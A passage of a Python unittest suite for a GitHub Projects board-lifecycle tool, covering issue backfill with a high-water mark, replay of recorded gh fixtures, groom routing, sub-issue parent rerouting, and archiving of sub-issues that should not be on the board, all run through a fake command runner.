        self.assertNotIn(str(lb.READY_WORK_LIMIT), list_call)

    def test_partial_failure_keeps_high_water_contiguous(self) -> None:
        # Issue 3's add fails; the mark advances only over the contiguous 1..2
        # prefix so "everything <= mark is present" holds and a re-run resumes.
        repo_issues = [{"number": i, "url": f"u{i}"} for i in (1, 2, 3, 4, 5)]
        runner = FakeRunner([
            (["project", "item-list", "1", "--owner", "acme"], _ok(json.dumps({"items": []}))),
            (["issue", "list", "--repo", "acme/widget"], _ok(json.dumps(repo_issues))),
            (["api", "graphql"], _ok(_parents_batch([1, 2, 3, 4, 5]))),
            (["project", "item-add", "1", "--owner", "acme"], _ok(json.dumps({"id": "i1"}))),
            (["project", "item-add", "1", "--owner", "acme"], _ok(json.dumps({"id": "i2"}))),
            (["project", "item-add", "1", "--owner", "acme"],
             subprocess.CompletedProcess([], 1, "", "boom")),
            (["project", "item-add", "1", "--owner", "acme"], _ok(json.dumps({"id": "i4"}))),
            (["project", "item-add", "1", "--owner", "acme"], _ok(json.dumps({"id": "i5"}))),
        ])
        result = lb.verb_backfill(self.ctx, runner)
        self.assertEqual(sorted(result["added"]), [1, 2, 4, 5])
        self.assertEqual([f["issue"] for f in result["failed"]], [3])
        self.assertEqual(result["high_water"], 2)   # contiguous prefix only
        self.assertEqual(self._marker(), 2)

    def test_marker_not_regressed_when_all_present(self) -> None:
        # Second run over a fully-backfilled board: no adds, marker stays put.
        (Path(self.ctx.main_root) / lb.COMMITTED_CONFIG).write_text(
            "---\ngithub_project_owner: acme\ngithub_project_number: 1\n"
            "github_project_backfilled_through: 2\n---\n", encoding="utf-8")
        board_items = {"items": [_issue_item(1), _issue_item(2)]}
        repo_issues = [{"number": 1, "url": "u1"}, {"number": 2, "url": "u2"}]
        runner = FakeRunner([
            (["project", "item-list", "1", "--owner", "acme"], _ok(json.dumps(board_items))),
            (["issue", "list", "--repo", "acme/widget"], _ok(json.dumps(repo_issues))),
        ])
        result = lb.verb_backfill(self.ctx, runner)
        self.assertEqual(result["added"], [])
        self.assertFalse(result["marker_written"])  # 2 is not > prior 2
        self.assertEqual(self._marker(), 2)

    def test_sub_issue_skipped_parentless_added(self) -> None:
        # Sub-issues carry no lifecycle stage; only parents belong on the board
        # (issue #269). Issue 2 is a sub-issue of #99 → skipped, not added; the
        # parentless 1 and 3 are added. A skip is a permanent decision, so — like
        # an already-present issue — it advances the contiguous high-water mark.
        repo_issues = [{"number": n, "url": f"u{n}"} for n in (1, 2, 3)]
        runner = FakeRunner([
            (["project", "item-list", "1", "--owner", "acme"], _ok(json.dumps({"items": []}))),
            (["issue", "list", "--repo", "acme/widget"], _ok(json.dumps(repo_issues))),
            (["api", "graphql"], _ok(_parents_batch([1, 2, 3], parents={2: 99}))),
            (["project", "item-add", "1", "--owner", "acme"], _ok(json.dumps({"id": "i1"}))),
            (["project", "item-add", "1", "--owner", "acme"], _ok(json.dumps({"id": "i3"}))),
        ])
        result = lb.verb_backfill(self.ctx, runner)
        self.assertEqual(result["added"], [1, 3])
        self.assertEqual(result["skipped_sub_issues"], [2])
        self.assertEqual(result["failed"], [])
        self.assertEqual(result["counts"],
                         {"added": 2, "already_present": 0,
                          "skipped_sub_issues": 1, "failed": 0})
        self.assertEqual(result["high_water"], 3)   # skip does not stall the mark
        self.assertTrue(result["marker_written"])
        self.assertEqual(self._marker(), 3)
        # The sub-issue never reached item-add (only the two parentless adds ran).
        self.assertEqual(sum(1 for c in runner.calls if c[:2] == ["project", "item-add"]), 2)

    def test_parent_lookup_failure_fails_toward_not_adding(self) -> None:
        # A single unreadable parent node must fail THAT candidate toward not
        # adding it (never risk sweeping a sub-issue on) and break the prefix so a
        # re-run reconsiders it — the rest of the loop still proceeds.
        repo_issues = [{"number": n, "url": f"u{n}"} for n in (1, 2, 3)]
        runner = FakeRunner([
            (["project", "item-list", "1", "--owner", "acme"], _ok(json.dumps({"items": []}))),
            (["issue", "list", "--repo", "acme/widget"], _ok(json.dumps(repo_issues))),
            (["api", "graphql"], _ok(_parents_batch([1, 2, 3], null_for={2}))),
            (["project", "item-add", "1", "--owner", "acme"], _ok(json.dumps({"id": "i1"}))),
            (["project", "item-add", "1", "--owner", "acme"], _ok(json.dumps({"id": "i3"}))),
        ])
        result = lb.verb_backfill(self.ctx, runner)
        self.assertEqual(sorted(result["added"]), [1, 3])
        self.assertEqual([f["issue"] for f in result["failed"]], [2])
        self.assertEqual(result["skipped_sub_issues"], [])
        self.assertEqual(result["high_water"], 1)   # contiguous prefix stops at 2
        self.assertEqual(self._marker(), 1)

    def test_skip_does_not_advance_mark_past_an_earlier_failure(self) -> None:
        # Candidate 1's parent lookup fails (breaks the contiguous prefix), then
        # candidate 2 is a legitimate sub-issue skip. The skip branch's advance is
        # guarded by `if contiguous:` — a broken prefix must keep the mark at 0 so
        # a re-run reconsiders 1 and the skip never masquerades as coverage.
        repo_issues = [{"number": n, "url": f"u{n}"} for n in (1, 2)]
        runner = FakeRunner([
            (["project", "item-list", "1", "--owner", "acme"], _ok(json.dumps({"items": []}))),
            (["issue", "list", "--repo", "acme/widget"], _ok(json.dumps(repo_issues))),
            (["api", "graphql"], _ok(_parents_batch([1, 2], parents={2: 99}, null_for={1}))),
        ])
        result = lb.verb_backfill(self.ctx, runner)
        self.assertEqual(result["added"], [])
        self.assertEqual([f["issue"] for f in result["failed"]], [1])
        self.assertEqual(result["skipped_sub_issues"], [2])
        self.assertEqual(result["high_water"], 0)          # skip stays behind the failure
        self.assertFalse(result["marker_written"])
        self.assertIsNone(self._marker())
        # No add was attempted at all.
        self.assertFalse(any(c[:2] == ["project", "item-add"] for c in runner.calls))

    def test_total_parent_lookup_failure_adds_nothing_without_aborting(self) -> None:
        # A whole-query parent-lookup failure fails EVERY candidate toward not
        # adding — the loop must not abort and must add nothing.
        repo_issues = [{"number": n, "url": f"u{n}"} for n in (1, 2)]
        runner = FakeRunner([
            (["project", "item-list", "1", "--owner", "acme"], _ok(json.dumps({"items": []}))),
            (["issue", "list", "--repo", "acme/widget"], _ok(json.dumps(repo_issues))),
            (["api", "graphql"], subprocess.CompletedProcess([], 1, "", "boom")),
        ])
        result = lb.verb_backfill(self.ctx, runner)
        self.assertEqual(result["added"], [])
        self.assertEqual([f["issue"] for f in result["failed"]], [1, 2])
        self.assertEqual(result["high_water"], 0)
        # No add was attempted (loop failed toward not-adding, did not abort).
        self.assertFalse(any(c[:2] == ["project", "item-add"] for c in runner.calls))

    def test_malformed_parent_lookup_body_degrades_like_total_failure(self) -> None:
        # rc==0 but non-JSON stdout must degrade exactly like an rc!=0 failure:
        # every candidate drops out of the parent map and is failed toward
        # not-adding — never a JSONDecodeError up the stack (the docstring's
        # "a total failure does NOT raise" promise).
        repo_issues = [{"number": n, "url": f"u{n}"} for n in (1, 2)]
        runner = FakeRunner([
            (["project", "item-list", "1", "--owner", "acme"], _ok(json.dumps({"items": []}))),
            (["issue", "list", "--repo", "acme/widget"], _ok(json.dumps(repo_issues))),
            (["api", "graphql"], _ok("<html>rate limited</html>")),  # rc 0, not JSON
        ])
        result = lb.verb_backfill(self.ctx, runner)  # must not raise
        self.assertEqual(result["added"], [])
        self.assertEqual([f["issue"] for f in result["failed"]], [1, 2])
        self.assertEqual(result["high_water"], 0)
        self.assertFalse(any(c[:2] == ["project", "item-add"] for c in runner.calls))


class FixtureReplayTest(unittest.TestCase):
    """Recorded gh fixtures are load-bearing: each is replayed through its real
    engine consumer so a shape drift in a re-record breaks a test, not prod."""

    FIXTURES = Path(__file__).resolve().parent / "fixtures" / "gh"

    def _load(self, name: str):
        return json.loads((self.FIXTURES / name).read_text(encoding="utf-8"))

    def test_project_field_list_resolves_all_seven_stages(self) -> None:
        payload = self._load("project_field_list.json")
        status, priority = lb.parse_field_list(payload)
        self.assertIsNotNone(status)
        options = {o["name"]: o["id"] for o in status.get("options", [])}
        for stage in lb.STAGES:
            self.assertIn(stage, options, f"{stage} not resolvable from recorded field-list")
        self.assertIsNotNone(priority)  # Priority field is present in the recording

    def test_issue_list_deps_blocked_by_is_dict_with_total_count(self) -> None:
        # The new parser reads blockedBy as {nodes, totalCount}; assert the
        # recorded shape matches (a plain-list re-record would break here).
        items = self._load("issue_list_deps.json")
        self.assertIsInstance(items, list)
        for item in items:
            self.assertIn("blockedBy", item)
            self.assertIsInstance(item["blockedBy"], dict)
            self.assertIn("totalCount", item["blockedBy"])
            self.assertEqual((item["blockedBy"] or {}).get("totalCount", 0),
                             item["blockedBy"]["totalCount"])

    def test_issue_view_closed_has_keys_engine_switches_on(self) -> None:
        data = self._load("issue_view_closed.json")
        self.assertEqual(data["state"], "CLOSED")
        self.assertEqual(data["stateReason"], "COMPLETED")
        self.assertIn("closedByPullRequestsReferences", data)
        self.assertIsInstance(data["closedByPullRequestsReferences"], list)

    def test_pr_view_merged_shape(self) -> None:
        data = self._load("pr_view_merged.json")
        self.assertEqual(data["state"], "MERGED")
        self.assertIsNotNone(data["mergedAt"])

    def test_project_item_list_issue_numbers_parse_from_recorded_shape(self) -> None:
        # Load-bearing: the recorded item-list is fed through _origin_issue_number
        # (the exact consumer verb_backfill's _board_issue_numbers uses). A future
        # re-record where content.repository stops being a plain string, or type
        # is renamed, breaks THIS test — not a live backfill. The fixture must be
        # non-empty for this to pin anything.
        payload = self._load("project_item_list.json")
        items = payload["items"]
        self.assertGreater(len(items), 0, "fixture must be non-empty to pin the shape")
        numbers = [lb._origin_issue_number(i, "aagnone3/agentic-engineering") for i in items]
        self.assertTrue(all(isinstance(n, int) for n in numbers),
                        "every recorded Issue item must resolve to an int number")
        # content.repository is a plain string in item-list output (not {nameWithOwner}).
        self.assertIsInstance(items[0]["content"]["repository"], str)


class GroomRouteTest(unittest.TestCase):
    """The groom Routing Ladder as data — one row per current stage, each a
    whole run path ending at STOP. Only `intake` leaves a decision to the model."""

    def _route(self, **kw):
        base = dict(has_issue=True, stage=None, plan_doc=None, brainstorm_doc=None,
                    provenance="trusted", stale_issue=False)
        base.update(kw)
        return lb.route_for_groom(**base)

    def test_no_issue_or_stub_is_intake(self) -> None:
        self.assertEqual(self._route(has_issue=False).route, "intake")
        self.assertEqual(self._route(stage="stub").route, "intake")
        # intake hands exactly one decision back to the model.
        self.assertIsNotNone(self._route(stage="stub").next)

    def test_brainstormed_plans_directly(self) -> None:
        self.assertEqual(self._route(stage="brainstormed", brainstorm_doc="b.md").route, "plan")
        # even without the doc present it routes to plan (plan repairs it)
        self.assertEqual(self._route(stage="brainstormed").route, "plan")

    def test_planned_with_doc_is_already_planned(self) -> None:
        self.assertEqual(self._route(stage="planned", plan_doc="p.md").route, "already_planned")

    def test_planned_without_doc_is_already_planned(self) -> None:
        self.assertEqual(self._route(stage="planned", plan_doc=None).route, "already_planned")

    def test_in_flight_stages_are_past(self) -> None:
        self.assertEqual(self._route(stage="in_progress").route, "past")
        self.assertEqual(self._route(stage="in_review").route, "past")

    def test_terminal_and_abandoned(self) -> None:
        self.assertEqual(self._route(stage="done").route, "terminal")
        self.assertEqual(self._route(stage="abandoned").route, "abandoned")

    def test_untrusted_provenance_blocks_before_any_stage_routing(self) -> None:
        r = self._route(stage="planned", plan_doc="p.md", provenance="untrusted")
        self.assertEqual(r.route, "blocked")
        self.assertEqual(r.blocker, "untrusted_provenance")

    def test_missing_issue_blocks(self) -> None:
        r = self._route(stage=None, stale_issue=True)
        self.assertEqual(r.route, "blocked")
        self.assertEqual(r.blocker, "issue_not_found")


class ParseCreatedIssueNumberTest(unittest.TestCase):
    def test_parses_trailing_number_from_create_url(self) -> None:
        self.assertEqual(lb.parse_created_issue_number("https://github.com/o/r/issues/183\n"), 183)

    def test_ignores_noise_and_trailing_slash_takes_last_url(self) -> None:
        out = "Creating issue\nhttps://github.com/o/r/issues/9/\n"
        self.assertEqual(lb.parse_created_issue_number(out), 9)

    def test_no_url_raises_rather_than_guessing(self) -> None:
        with self.assertRaises(lb.BoardError) as cm:
            lb.parse_created_issue_number("some unrelated output")
        self.assertEqual(cm.exception.code, "issue_create_parse_failed")


class DecomposeSpecValidationTest(unittest.TestCase):
    def test_valid_spec_returns_ordered_subs(self) -> None:
        spec = {"plan_path": "docs/plans/p.md", "sub_issues": [
            {"title": "a", "body_file": "s1.md"},
            {"title": "b", "body_file": "s2.md", "blocked_by": [0]}]}
        subs = lb.validate_decompose_spec(spec, has_parent=True)
        self.assertEqual(len(subs), 2)

    def test_missing_plan_path_rejected(self) -> None:
        with self.assertRaises(lb.BoardError) as cm:
            lb.validate_decompose_spec({"sub_issues": []}, has_parent=True)
        self.assertEqual(cm.exception.code, "invalid_decompose_spec")

    def test_forward_and_self_dependency_rejected(self) -> None:
        # forward: sub 0 depends on sub 1 (not yet created)
        fwd = {"plan_path": "p", "sub_issues": [{"title": "a", "body_file": "s", "blocked_by": [1]}]}
        # self: sub 0 depends on itself
        selfdep = {"plan_path": "p", "sub_issues": [{"title": "a", "body_file": "s", "blocked_by": [0]}]}
        for bad in (fwd, selfdep):
            with self.assertRaises(lb.BoardError) as cm:
                lb.validate_decompose_spec(bad, has_parent=True)
            self.assertEqual(cm.exception.code, "invalid_decompose_spec")

    def test_parent_title_required_only_when_creating(self) -> None:
        spec = {"plan_path": "p", "sub_issues": []}
        # creating (no parent number) needs a title
        with self.assertRaises(lb.BoardError):
            lb.validate_decompose_spec(spec, has_parent=False)
        # updating an existing parent does not
        self.assertEqual(lb.validate_decompose_spec(spec, has_parent=True), [])

    def test_valid_complexity_on_parent_and_subs_accepted(self) -> None:
        spec = {"plan_path": "p", "complexity": "low", "sub_issues": [
            {"title": "a", "body_file": "s1", "complexity": "high"},
            {"title": "b", "body_file": "s2"}]}  # sub omitting complexity stays valid
        subs = lb.validate_decompose_spec(spec, has_parent=True)
        self.assertEqual(len(subs), 2)

    def test_omitted_complexity_still_valid(self) -> None:
        spec = {"plan_path": "p", "sub_issues": [{"title": "a", "body_file": "s"}]}
        # No complexity anywhere is backward compatible — no raise.
        self.assertEqual(len(lb.validate_decompose_spec(spec, has_parent=True)), 1)

    def test_out_of_vocabulary_complexity_rejected(self) -> None:
        parent_bad = {"plan_path": "p", "complexity": "epic", "sub_issues": []}
        sub_bad = {"plan_path": "p", "sub_issues": [
            {"title": "a", "body_file": "s", "complexity": "huge"}]}
        for bad in (parent_bad, sub_bad):
            with self.assertRaises(lb.BoardError) as cm:
                lb.validate_decompose_spec(bad, has_parent=True)
            self.assertEqual(cm.exception.code, "invalid_decompose_spec")


class SubIssueParsingTest(unittest.TestCase):
    """parse_issue_state must surface EVERY sub-issue (open + closed) with its
    blocked-by count — the exact data the groom postcondition reports."""

    def test_all_sub_issues_and_blocked_counts(self) -> None:
        payload = {"data": {"repository": {"issue": {
            "number": 182, "state": "OPEN", "authorAssociation": "MEMBER", "url": "u",
            "subIssues": {"nodes": [
                {"number": 183, "state": "OPEN", "blockedBy": {"totalCount": 0}},
                {"number": 184, "state": "OPEN", "blockedBy": {"totalCount": 1}},
                {"number": 185, "state": "CLOSED", "blockedBy": {"totalCount": 1}}]},
            "projectItems": {"nodes": []}}}}}
        st = lb.parse_issue_state(payload, lb.BoardConfig(owner="o", number=1, source="committed"))
        self.assertEqual(len(st.all_sub_issues), 3)  # closed ones counted too
        self.assertEqual(sum(1 for s in st.all_sub_issues if s["blocked_by"] > 0), 2)
        self.assertEqual(st.open_sub_issues, [183, 184])  # unchanged contract

    def test_archived_project_item_parses_as_not_on_board(self) -> None:
        # projectItems defaults to includeArchived:true, so a rule-6-archived item
        # is STILL returned (id + Status intact) flagged isArchived. It must parse
        # as not-on-board (item_id None, stage None) — the invariant that makes
        # de-boarding idempotent against real GraphQL.
        board = lb.BoardConfig(owner="o", number=1, source="committed")
        payload = {"data": {"repository": {"issue": {
            "number": 263, "state": "OPEN", "authorAssociation": "OWNER", "url": "u",
            "subIssues": {"nodes": []},
            "projectItems": {"nodes": [{
                "id": "IT_9", "isArchived": True,
                "project": {"number": 1, "owner": {"login": "o"}},
                "fieldValueByName": {"name": "stub"}}]}}}}}
        st = lb.parse_issue_state(payload, board)
        self.assertIsNone(st.item_id)
        self.assertIsNone(st.stage)
        # A NON-archived item on the same board still binds (regression guard).
        payload["data"]["repository"]["issue"]["projectItems"]["nodes"][0]["isArchived"] = False
        st2 = lb.parse_issue_state(payload, board)
        self.assertEqual(st2.item_id, "IT_9")
        self.assertEqual(st2.stage, "stub")


def _parented_payload(number=263, parent=265, stage="stub", state="OPEN",
                      author="OWNER"):
    """A sub-issue #263 whose native parent link points at the already-planned
    parent #265, carrying its own (noise) board stage. Reproduces the misroute
    that #266 fixes: the child's stub stage must NOT drive a groom/plan route."""
    node = {"number": number, "state": state, "authorAssociation": author,
            "url": "u", "parent": {"number": parent},
            "subIssues": {"nodes": []},
            "projectItems": {"nodes": []}}
    if stage is not None:
        node["projectItems"]["nodes"] = [{
            "id": "item",
            "project": {"number": 1, "owner": {"login": "o"}},
            "fieldValueByName": {"name": stage}}]
    return {"data": {"repository": {"issue": node}}}


class ParentAwareSubIssueGateTest(unittest.TestCase):
    """#266 regression: an OPEN sub-issue with a native parent link must route
    to the parent (verdict/route `sub_issue` + `parent: N`) from every gate,
    never to an intake/grooming route driven by the child's own board stage.
    Reproduces the observed #263 misroute (parent #265, child board stage
    `stub`) purely from fixture JSON parsed by parse_issue_state."""

    BOARD = lb.BoardConfig(owner="o", number=1, source="committed")

    def _state(self, **kw):
        return lb.parse_issue_state(_parented_payload(**kw), self.BOARD)

    def test_parent_number_parsed_from_native_link(self) -> None:
        self.assertEqual(self._state().parent_number, 265)

    def test_standalone_issue_has_no_parent_number(self) -> None:
        payload = {"data": {"repository": {"issue": {
            "number": 42, "state": "OPEN", "authorAssociation": "OWNER", "url": "u",
            "subIssues": {"nodes": []}, "projectItems": {"nodes": []}}}}}
        self.assertIsNone(lb.parse_issue_state(payload, self.BOARD).parent_number)

    def test_work_gate_reroutes_open_subissue_to_parent(self) -> None:
        st = self._state(stage="stub")  # the exact #263 shape
        g = lb.evaluate_gate("work", st.stage, True, None, None,
                             parent_number=st.parent_number, issue_state=st.state)
        self.assertEqual(g.verdict, "sub_issue")
        self.assertEqual(g.parent, 265)
        self.assertNotEqual(g.verdict, "route_to_plan")  # the reproduced misroute

    def test_every_gate_command_reroutes_open_subissue(self) -> None:
        st = self._state(stage="stub")
        for command in ("brainstorm", "plan", "work", "compound", "orchestrate"):
            with self.subTest(command=command):
                g = lb.evaluate_gate(command, st.stage, True, None, None,
                                     parent_number=st.parent_number, issue_state=st.state)
                self.assertEqual(g.verdict, "sub_issue")
                self.assertEqual(g.parent, 265)
                self.assertIsNotNone(g.next)

    def test_groom_entry_reroutes_open_subissue_to_parent(self) -> None:
        st = self._state(stage="stub")  # the exact #263 shape
        r = lb.route_for_groom(True, st.stage, None, None, "trusted",
                               parent_number=st.parent_number, issue_state=st.state)
        self.assertEqual(r.route, "sub_issue")
        self.assertEqual(r.parent, 265)
        self.assertIsNotNone(r.next)

    def test_closed_subissue_keeps_current_behavior(self) -> None:
        # Terminal (CLOSED) sub-issues do not reroute — only OPEN ones do.
        st = self._state(stage="stub", state="CLOSED")
        g = lb.evaluate_gate("work", st.stage, True, None, None,
                             parent_number=st.parent_number, issue_state=st.state)
        self.assertNotEqual(g.verdict, "sub_issue")

    def test_parentless_issue_uses_normal_gate(self) -> None:
        # Regression guard: absent a parent, behavior is unchanged.
        g = lb.evaluate_gate("work", "stub", True, None, None,
                             parent_number=None, issue_state="OPEN")
        self.assertEqual((g.verdict, g.route), ("route_to_plan", "plan"))

    def test_sub_issue_in_verdict_and_route_vocabularies(self) -> None:
        # Freeze the closed-set contract by category, not by scattering literals.
        self.assertIn("sub_issue", lb.VERDICTS)
        self.assertIn("sub_issue", lb.GROOM_ROUTES)

    def test_untrusted_open_sub_still_routes_sub_issue(self) -> None:
        # Deliberate ordering: for an OPEN parented sub, `sub_issue` beats
        # `untrusted_provenance` (the parent re-checks provenance during its own
        # groom). Freeze that ordering so it can't silently flip to a `blocked`
        # untrusted verdict, which would strand the child instead of routing it.
        r = lb.route_for_groom(True, "stub", None, None, "untrusted",
                               parent_number=265, issue_state="OPEN")
        self.assertEqual(r.route, "sub_issue")
        self.assertEqual(r.parent, 265)
        self.assertIsNone(r.blocker)


def _ctx(root: str, slug=("o", "r")) -> "lb.RepoContext":
    return lb.RepoContext(root=root, main_root=root, origin_owner=slug[0],
                          origin_repo=slug[1], default_branch="main")


def _subissue_payload(item=True, stage="stub", state="OPEN", archived=False):
    """An OPEN native sub-issue #263 of parent #265, optionally carrying its own
    (invariant-violating) board item. Drives the rule-6 de-board path.

    `archived=True` models the REALISTIC post-archive payload real GraphQL
    returns: projectItems defaults to includeArchived:true, so the node is still
    present (id + Status intact) but flagged isArchived — which parse_issue_state
    must treat as not-on-board. This is the fixture the idempotency tests use;
    `item=False` (node absent) is not a shape real GraphQL produces after archive."""
    node = {"number": 263, "state": state, "stateReason": None,
            "authorAssociation": "OWNER", "url": "u", "parent": {"number": 265},
            "assignees": {"nodes": []},
            "closedByPullRequestsReferences": {"nodes": []},
            "blockedBy": {"totalCount": 0, "nodes": []},
            "subIssues": {"nodes": []}, "projectItems": {"nodes": []}}
    if item:
        node["projectItems"]["nodes"] = [{
            "id": "IT_9", "isArchived": archived,
            "project": {"number": 1, "owner": {"login": "o"}},
            "fieldValueByName": {"name": stage}}]
    return json.dumps({"data": {"repository": {"issue": node}}})


class ParentAwareVerbThreadingTest(unittest.TestCase):
    """P2 guard: the effectful verbs must THREAD state.parent_number into the
    routing core. Without a verb-level test, deleting
    `parent_number = state.parent_number` (or narrowing the evaluate_gate /
    route_for_groom call) passes the entire pure-function suite while reproducing
    the original #263 CLI misroute. Driven end-to-end over a FakeRunner from the
    #263 fixture (parent #265, child board stage `stub`)."""

    BOARD = lb.BoardConfig(owner="o", number=1, source="committed")

    def test_verb_gate_threads_parent_and_routes_sub_issue(self) -> None:
        runner = FakeRunner([
            (["api", "graphql"], _ok(json.dumps(_parented_payload(stage="stub")))),
        ])
        with mock.patch.object(lb, "read_board_config", return_value=self.BOARD), \
                tempfile.TemporaryDirectory() as d:
            out = lb.verb_gate("work", 263, _ctx(d), runner)
        self.assertEqual(out["verdict"], "sub_issue")
        self.assertEqual(out["route"], "parent")
        self.assertEqual(out["parent"], 265)
        self.assertIsNotNone(out["next"])

    def test_verb_groom_entry_threads_parent_and_routes_sub_issue(self) -> None:
        # verb_reconcile is short-circuited (its own seams are exercised
        # elsewhere); this isolates the parent-threading through route_for_groom.
        runner = FakeRunner([
            (["api", "graphql"], _ok(json.dumps(_parented_payload(stage="stub")))),
        ])
        with mock.patch.object(lb, "read_board_config", return_value=self.BOARD), \
                mock.patch.object(lb, "verb_reconcile",
                                  return_value={"skipped_ttl": True, "flags": []}), \
                tempfile.TemporaryDirectory() as d:
            out = lb.verb_groom_entry(263, _ctx(d), runner)
        self.assertEqual(out["route"], "sub_issue")
        self.assertEqual(out["parent"], 265)
        self.assertIsNotNone(out["next"])


class SubIssueDeboardReconcileTest(unittest.TestCase):
    """Rule 6 end-to-end through verb_reconcile over a FakeRunner: an open
    parented issue's board item is archived + audit comment; the second run
    (item gone) is a no-op; and the CI-add-after-verify race converges here."""

    BOARD = lb.BoardConfig(owner="o", number=1, source="committed")

    def _reconcile(self, root, payload):
        runner = FakeRunner(payload)
        with mock.patch.object(lb, "read_board_config", return_value=self.BOARD), \
                mock.patch.object(lb, "load_cache", return_value={}), \
                mock.patch.object(lb, "save_cache", lambda *a, **k: None):
            return runner, lb.verb_reconcile(_ctx(root), runner, issue=263, force=True)

    def test_boarded_open_subissue_is_archived_with_audit_comment(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            runner, out = self._reconcile(d, [
                (["api", "graphql"], _ok(_subissue_payload(item=True))),
                (["project", "item-archive", "1", "--owner", "o", "--id", "IT_9"],
                 _ok("{}")),
                (["issue", "comment", "263", "--repo", "o/r", "--body"], _ok("")),
            ])
            self.assertEqual([r["rule"] for r in out["repairs_applied"]],
                             ["sub_issue_on_board"])
            self.assertEqual(out["repairs_failed"], [])
            # the audit comment names the parent
            comment = runner.calls[-1][runner.calls[-1].index("--body") + 1]
            self.assertIn("#265", comment)

    def test_second_run_after_removal_is_a_noop(self) -> None:
        # The idempotent second run against the REALISTIC post-archive payload:
        # projectItems still returns the item, but flagged isArchived:true (real
        # GraphQL defaults to includeArchived). parse_issue_state must read it as
        # not-on-board, so plan_repairs sees item_id None -> no archive, no
        # comment, no repair. (Proves the no-op against a payload real GraphQL
        # actually produces, not a hand-removed item.)
        with tempfile.TemporaryDirectory() as d:
            runner, out = self._reconcile(d, [
                (["api", "graphql"], _ok(_subissue_payload(item=True, archived=True))),
            ])
            self.assertEqual(out["repairs_applied"], [])
            self.assertEqual(out["repairs_failed"], [])
            self.assertEqual(runner.responses, [])  # only the read happened

    def test_ci_add_after_verify_race_is_repaired_at_reconcile(self) -> None:
        # groom-verify saw no board item (CI had not added it yet); the item
        # appears only now, at reconcile time — the convergence guarantee fires.
        with tempfile.TemporaryDirectory() as d:
            _runner, out = self._reconcile(d, [
                (["api", "graphql"], _ok(_subissue_payload(item=True, stage="stub"))),
                (["project", "item-archive", "1", "--owner", "o", "--id", "IT_9"],
                 _ok("{}")),
                (["issue", "comment", "263", "--repo", "o/r", "--body"], _ok("")),
            ])
            self.assertEqual([r["rule"] for r in out["repairs_applied"]],
                             ["sub_issue_on_board"])

    def test_global_sweep_discovers_no_status_open_sub(self) -> None:
        # P1-A: `add-to-project.yml` auto-adds a sub WITHOUT setting Status, so a
        # CI-added sub sits in the NO-STATUS bucket. A GLOBAL reconcile (no
        # hand-picked --issue) must enumerate it via the sweep's `no:status` leg
        # and de-board it. Before that leg existed, the four in_progress/terminal
        # legs never enumerated it and rule 6 never fired for its own async-CI-add
        # race — the exact convergence gap this leg closes.
        item = {"content": {"type": "Issue", "number": 263, "repository": "o/r",
                            "title": "t"}}

        def leg(query, items):
            return (["project", "item-list", "1", "--owner", "o", "--format",
                     "json", "--limit", str(lb.RECONCILE_ITEM_LIMIT), "--query", query],
                    _ok(json.dumps({"items": items})))

        responses = [
            leg("status:in_progress", []),
            leg("status:in_review", []),
            leg("status:done", []),
            leg("status:abandoned", []),
            leg("no:status", [item]),          # the CI-added sub lands here
            leg("status:stub", []),
            leg("status:brainstormed", []),
            leg("status:planned", []),
            (["api", "graphql"], _ok(_subissue_payload(item=True))),
            (["project", "item-archive", "1", "--owner", "o", "--id", "IT_9"], _ok("{}")),
            (["issue", "comment", "263", "--repo", "o/r", "--body"], _ok("")),
        ]
        with tempfile.TemporaryDirectory() as d:
            runner = FakeRunner(responses)
            with mock.patch.object(lb, "read_board_config", return_value=self.BOARD), \
                    mock.patch.object(lb, "load_cache", return_value={}), \
                    mock.patch.object(lb, "save_cache", lambda *a, **k: None):
                out = lb.verb_reconcile(_ctx(d), runner, issue=None, force=True)
        self.assertEqual([r["rule"] for r in out["repairs_applied"]],
                         ["sub_issue_on_board"])

    def test_failed_archive_is_reported_not_fatal(self) -> None:
        fail = subprocess.CompletedProcess(args=[], returncode=1, stdout="", stderr="nope")
        with tempfile.TemporaryDirectory() as d:
            _runner, out = self._reconcile(d, [
                (["api", "graphql"], _ok(_subissue_payload(item=True))),
                (["project", "item-archive", "1", "--owner", "o", "--id", "IT_9"], fail),
            ])
            self.assertEqual(out["repairs_applied"], [])
            self.assertEqual([r["rule"] for r in out["repairs_failed"]],
                             ["sub_issue_on_board"])
            self.assertEqual(out["repairs_failed"][0]["error_code"], "deboard_failed")


class DeboardSubissueHelperTest(unittest.TestCase):
    """The best-effort `_deboard_subissue` seam used by decompose and
    groom-verify: read the sub's board membership, archive it if present, and
    never raise — every failure degrades to a reported result."""

    BOARD = lb.BoardConfig(owner="o", number=1, source="committed")

    def test_archives_when_the_sub_has_a_board_item(self) -> None:
        runner = FakeRunner([
            (["api", "graphql"], _ok(_subissue_payload(item=True))),
            (["project", "item-archive", "1", "--owner", "o", "--id", "IT_9"], _ok("{}")),
        ])
        with mock.patch.object(lb, "read_board_config", return_value=self.BOARD):
            out = lb._deboard_subissue(263, self.BOARD, _ctx("/tmp"), runner)
        self.assertEqual(out, {"issue": 263, "deboarded": True})

    def test_noop_when_the_sub_is_not_boarded(self) -> None:
        runner = FakeRunner([(["api", "graphql"], _ok(_subissue_payload(item=False)))])
        with mock.patch.object(lb, "read_board_config", return_value=self.BOARD):
            out = lb._deboard_subissue(263, self.BOARD, _ctx("/tmp"), runner)
        self.assertEqual(out, {"issue": 263, "deboarded": False})

    def test_read_failure_is_reported_never_raised(self) -> None:
        fail = subprocess.CompletedProcess(args=[], returncode=1, stdout="", stderr="net down")
        runner = FakeRunner([(["api", "graphql"], fail)])
        with mock.patch.object(lb, "read_board_config", return_value=self.BOARD):
            out = lb._deboard_subissue(263, self.BOARD, _ctx("/tmp"), runner)
        self.assertFalse(out["deboarded"])
        self.assertIn("error", out)

    def test_archive_failure_is_reported_never_raised(self) -> None:
        fail = subprocess.CompletedProcess(args=[], returncode=1, stdout="", stderr="denied")
        runner = FakeRunner([
            (["api", "graphql"], _ok(_subissue_payload(item=True))),
            (["project", "item-archive", "1", "--owner", "o", "--id", "IT_9"], fail),
        ])
        with mock.patch.object(lb, "read_board_config", return_value=self.BOARD):
            out = lb._deboard_subissue(263, self.BOARD, _ctx("/tmp"), runner)
        self.assertFalse(out["deboarded"])
        self.assertIn("error", out)

    def test_malformed_json_read_is_reported_never_raised(self) -> None:
        # returncode 0 but non-JSON stdout: fetch_issue_state's json.loads raises
        # ValueError (json.JSONDecodeError). The best-effort de-board must degrade
        # to a reported result, not crash — its whole contract is to never raise.
        runner = FakeRunner([(["api", "graphql"], _ok("not json{"))])
